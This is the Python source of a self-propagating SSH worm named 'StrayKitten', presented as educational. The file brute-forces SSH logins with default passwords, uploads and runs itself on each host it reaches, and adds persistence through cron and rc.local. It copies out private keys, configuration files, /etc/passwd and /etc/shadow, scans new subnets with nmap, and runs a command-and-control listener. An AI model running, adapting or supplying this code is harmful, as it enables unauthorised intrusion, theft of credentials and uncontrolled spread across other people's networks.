#!/usr/bin/env python3

""" 
This is a simple implementation of a worm for educational purposes only.
"""

import logging
import os
import paramiko
import scp
import socket
import sys
import threading
import time
from datetime import datetime
import ipaddress
import random

class StrayKitten:
    """ Principal class for the worm """

    def __init__(self, network_address):
        self._network = network_address
        self.infected_hosts = set()
        self.command_server = None
        self.exfil_dir = f"exfil_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        if not os.path.exists(self.exfil_dir):
            os.makedirs(self.exfil_dir)

    @property
    def network(self):
        """ Network, on which the worm spreads. """
        return self._network

    @network.setter
    def network(self, new_network):
        self._network = new_network

    @property
    def possible_credentials(self):
        return (
            ('user', 'user'),
            ('root', 'root'),
            ('admin', 'admin'),
            ('admin', 'password'),
            ('administrator', 'password'),
            ('oracle', 'oracle'),
            ('ubuntu', 'ubuntu'),
            ('kali', 'kali'),
            ('pi', 'raspberry'),
            ('vagrant', 'vagrant'),
            ('user', 'password'),
            ('test', 'test'),
            ('msfadmin', 'msfadmin'),
        )
    
    def generate_target_addresses(self):
        try:
            if '/' in self.network:
                network = ipaddress.ip_network(self.network, strict=False)
            else:
                network = ipaddress.ip_network(f"{self.network}/24", strict=False)
            hosts = list(network.hosts())
            # randomize the order of hosts to avoid predictable scanning
            random.shuffle(hosts)
            local_ip = socket.gethostbyname(socket.gethostname())
            for host in hosts:
                host_str = str(host)
                if host_str != local_ip:
                    yield host_str
                    
        except Exception as e:
            logging.error(f"Error generating addresses: {e}")
            network = self.network.split('.')
            addresses = []
            for host in range(1, 255):
                network[-1] = str(host)
                addresses.append('.'.join(network))
            random.shuffle(addresses)
            for addr in addresses:
                yield addr

    def attempt_connection(self, ssh, remote_address):
        logging.debug(f'Attempting connection to {remote_address}')
        
        if remote_address in self.infected_hosts:
            logging.debug(f'Host {remote_address} already infected, skipping')
            return False
            
        for user, passw in self.possible_credentials:
            try:
                ssh.connect(remote_address, port=22, username=user, password=passw, timeout=5)
                logging.info(f'Successfully connected to {remote_address} with [{user}:{passw}]')
                
                with scp.SCPClient(ssh.get_transport()) as scp_client:
                    self.exfiltrate_data(remote_address, ssh, scp_client)
                    
                    try:
                        scp_client.put(sys.argv[0], 'straykitten.py')
                        logging.info(f'Worm uploaded to {remote_address}')
                        
                        stdin, stdout, stderr = ssh.exec_command('nohup python3 straykitten.py &')
                        logging.info(f'Worm executed on {remote_address}')
                        
                        self.establish_persistence(ssh)
                        
                        self.deploy_payload(remote_address, ssh)
                        
                        self.infected_hosts.add(remote_address)
                        
                        new_subnet = '.'.join(remote_address.split('.')[:3]) + '.0/24'
                        self.scan_subnet(ssh, new_subnet)
                        
                    except Exception as e:
                        logging.error(f'Error deploying to {remote_address}: {str(e)}')
                return True
                
            except socket.timeout:
                logging.debug(f'{remote_address} connection timed out')
            except paramiko.AuthenticationException:
                logging.debug(f'{remote_address} rejected credentials [{user}:{passw}]')
            except paramiko.SSHException as e:
                logging.debug(f'SSH error with {remote_address}: {str(e)}')
            except Exception as e:
                logging.debug(f'Error connecting to {remote_address}: {str(e)}')
        return False

    def spread(self):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for remote_address in self.generate_target_addresses():
            self.attempt_connection(ssh, remote_address)
        ssh.close()
    
    def spread_threaded(self, max_threads=10):
        addresses = list(self.generate_target_addresses())
        def worker(address_list):
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            for remote_address in address_list:
                self.attempt_connection(ssh, remote_address)
            ssh.close()
        
        thread_count = min(max_threads, len(addresses))
        threads = []
        chunk_size = len(addresses) // thread_count
        
        for i in range(thread_count):
            start = i * chunk_size
            end = start + chunk_size if i < thread_count - 1 else len(addresses)
            thread = threading.Thread(target=worker, args=(addresses[start:end],))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    def establish_persistence(self, ssh):
        try:
            command = 'echo "#!/bin/bash\npython3 $(pwd)/straykitten.py &" > ~/.startup_script.sh'
            ssh.exec_command(command)
            ssh.exec_command('chmod +x ~/.startup_script.sh')
            ssh.exec_command('(crontab -l 2>/dev/null; echo "@reboot ~/.startup_script.sh") | crontab -')
            logging.debug('Persistence established on the remote host')
            ssh.exec_command('if [ -f /etc/rc.local ]; then sed -i "s|^exit 0|python3 $(pwd)/straykitten.py\\nexit 0|" /etc/rc.local; fi')
        except Exception as e:
            logging.debug(f'Failed to establish persistence: {e}')

    def exfiltrate_data(self, host, ssh, scp_client):
        try:
            host_dir = os.path.join(self.exfil_dir, host.replace('.', '_'))
            if not os.path.exists(host_dir):
                os.makedirs(host_dir)
            
            stdin, stdout, stderr = ssh.exec_command(
                'find /home -type f -name "*.txt" -o -name "*.conf" -o -name "*.key" -o -name "*.pem" 2>/dev/null | head -10'
            )
            
            output = stdout.read().decode('utf-8').strip()
            files_to_exfiltrate = output.split('\n') if output else []
            
            for remote_file in files_to_exfiltrate:
                if remote_file:
                    try:
                        filename = os.path.basename(remote_file)
                        local_path = os.path.join(host_dir, filename)
                        scp_client.get(remote_file, local_path)
                        logging.debug(f'Exfiltrated {remote_file} to {local_path}')
                    except Exception as e:
                        logging.debug(f'Failed to exfiltrate {remote_file}: {e}')
                        
            for password_file in ['/etc/passwd', '/etc/shadow', 'passwords.txt']:
                try:
                    local_path = os.path.join(host_dir, os.path.basename(password_file))
                    scp_client.get(password_file, local_path)
                    logging.debug(f'Exfiltrated {password_file}')
                except Exception:
                    pass
        except Exception as e:
            logging.debug(f'Exfiltration failed: {e}')

    def deploy_payload(self, host, ssh):
        try:
            commands = [
                "uname -a",       # system info             
                "whoami",         # current user
                "id",             # user ID and groups
                "ip addr",        # network configuration
                "ps aux | head",  # running processes 
                "cat /etc/hosts", # josts file
                "netstat -tuln",  # open ports
                "df -h"           # disk usage
            ]
            
            host_dir = os.path.join(self.exfil_dir, host.replace('.', '_'))
            if not os.path.exists(host_dir):
                os.makedirs(host_dir)

            with open(os.path.join(host_dir, "system_info.txt"), "w") as f:
                f.write(f"=== System Information for {host} ===\n")
                f.write(f"Collection Time: {datetime.now()}\n\n")
                
                for cmd in commands:
                    f.write(f"=== {cmd} ===\n")
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    output = stdout.read().decode('utf-8')
                    f.write(f"{output}\n\n")
            
            logging.debug(f'System information collected from {host}')
        except Exception as e:
            logging.debug(f'Command execution failed: {e}')

    def scan_subnet(self, ssh, subnet):
        try:
            ssh.exec_command("which nmap || apt-get install -y nmap 2>/dev/null || yum install -y nmap 2>/dev/null")
            stdin, stdout, stderr = ssh.exec_command(f"nmap -sn {subnet} 2>/dev/null")
            scan_result = stdout.read().decode('utf-8')

            new_targets = []
            for line in scan_result.splitlines():
                if "Nmap scan report for" in line:
                    parts = line.split()
                    if "(" in line:  
                        ip = parts[-1].strip("()")
                    else: 
                        ip = parts[-1]
                    new_targets.append(ip)
            
            logging.debug(f'Found {len(new_targets)} potential new targets on subnet {subnet}')
            
            for target in new_targets:
                if target not in self.infected_hosts:
                    logging.debug(f'Adding new target: {target}')
            
            return new_targets
        except Exception as e:
            logging.debug(f'Subnet scanning failed: {e}')
            return []

    def start_command_server(self, port=4444):
        def server_thread():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(('0.0.0.0', port))
                server.listen(5)
                logging.info(f"Command server listening on 0.0.0.0:{port}")
                
                while True:
                    client, address = server.accept()
                    logging.info(f"Connection from {address[0]}:{address[1]}")
                    
                    
                    client.send(b"IDENTIFY\n")
                    response = client.recv(1024).decode('utf-8').strip()
                    
                    with open("connections.log", "a") as f:
                        f.write(f"{datetime.now()} - Connection from {address[0]}:{address[1]} - {response}\n")
                    
                    client.settimeout(10)
                    try:
                        while True:
                            data = client.recv(4096)
                            if not data:
                                break
                            with open(f"data_{address[0]}.bin", "ab") as f:
                                f.write(data)
                    except socket.timeout:
                        pass
                    finally:
                        client.close()
            
            except Exception as e:
                logging.error(f"Command server error: {e}")
                
        thread = threading.Thread(target=server_thread)
        thread.daemon = True
        thread.start()
        self.command_server = thread

    def report_to_command_server(self, server_address, port=4444):
        """Report back to a command and control server."""
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_address, port))
            
            data = s.recv(1024)
            if data.strip() == b"IDENTIFY":
                s.send(f"AGENT:{hostname}:{local_ip}:Python{sys.version_info.major}.{sys.version_info.minor}\n".encode())

            s.close()
            logging.debug(f"Successfully reported to C&C server at {server_address}:{port}")
            
        except Exception as e:
            logging.debug(f"Failed to report to C&C server: {e}")


if __name__ == "__main__":
    for handler in logging.root.handlers[:]:
        logging.root.removeHandler(handler)
        
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        filename="straykitten.log",
        filemode='a'  
    )
    
    logging.getLogger('paramiko').setLevel(logging.CRITICAL)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        network = '.'.join(local_ip.split('.')[:3]) + '.0/24'
    except:
        network = '192.168.0.0/24'
        
    logging.info(f"Starting worm on network: {network}")
    
    worm = StrayKitten(network)
    
    try:
        worm.start_command_server()
        logging.info("Command server started")
    except Exception as e:
        logging.error(f"Failed to start command server: {e}")
    
    try:
        worm.spread_threaded(5)
    except Exception as e:
        logging.error(f"Error during spreading: {e}")
        try:
            worm.spread()
        except Exception as e2:
            logging.error(f"Critical error in worm spreading: {e2}")
    
    logging.info("Worm execution complete")
